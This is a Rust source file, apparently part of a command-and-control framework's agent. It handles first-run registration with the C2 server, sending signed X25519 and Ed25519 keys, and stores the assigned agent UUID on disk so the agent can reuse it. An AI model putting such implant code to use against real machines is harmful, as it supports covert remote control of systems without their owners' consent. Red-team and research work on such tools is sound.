use crate::{config, Error};
use common::api;
use std::{fs, path::PathBuf};
use x25519_dalek::x25519;

/// File where the assigned agent UUID is persisted between restarts
const AGENT_ID_FILE: &str = "agent_id";

/// Load agent UUID from disk, or register with the C2 server and save it.
pub fn get_or_register_agent_id(
    api_client: &ureq::Agent,
    conf: &config::Config,
) -> Result<uuid::Uuid, Error> {
    let id_file = agent_id_file_path()?;

    // If we already have a stored UUID, use it
    if id_file.exists() {
        let id_str = fs::read_to_string(&id_file)?;
        let id = uuid::Uuid::parse_str(id_str.trim())
            .map_err(|e| Error::Internal(format!("Stored agent UUID is invalid: {}", e)))?;
        log::debug!("Loaded existing agent_id: {}", id);
        return Ok(id);
    }

    // First run: register with the C2 server
    log::debug!("Registering agent with C2 server...");

    // Compute the public prekey from our X25519 private prekey
    let public_prekey = x25519(
        conf.private_prekey.clone(),
        x25519_dalek::X25519_BASEPOINT_BYTES,
    );

    // Sign the public prekey with our Ed25519 identity key
    let identity =
        ed25519_dalek::ExpandedSecretKey::from(&conf.identity_private_key);
    let signature =
        identity.sign(&public_prekey, &conf.identity_public_key);

    let register_body = api::RegisterAgent {
        identity_public_key: conf.identity_public_key.to_bytes(),
        public_prekey,
        public_prekey_signature: signature.to_bytes().to_vec(),
    };

    let register_url = format!("{}/api/agents", conf.server_url);
    let response = api_client
        .post(&register_url)
        .send_json(ureq::json!(register_body))
        .map_err(|e| Error::Internal(format!("Registration HTTP error: {}", e)))?;

    let api_res: api::Response<api::AgentRegistered> = response
        .into_json()
        .map_err(|e| Error::Internal(format!("Registration response parse error: {}", e)))?;

    let registered = api_res
        .data
        .ok_or_else(|| Error::Internal("Server returned no agent ID".to_string()))?;

    // Persist the UUID so we reuse it on subsequent runs
    if let Err(e) = fs::write(&id_file, registered.id.to_string()) {
        log::warn!("Could not persist agent_id to disk: {}", e);
    }

    log::debug!("Registered as agent_id: {}", registered.id);
    Ok(registered.id)
}

fn agent_id_file_path() -> Result<PathBuf, Error> {
    let mut path = config::get_agent_directory()?;
    path.push(AGENT_ID_FILE);
    Ok(path)
}
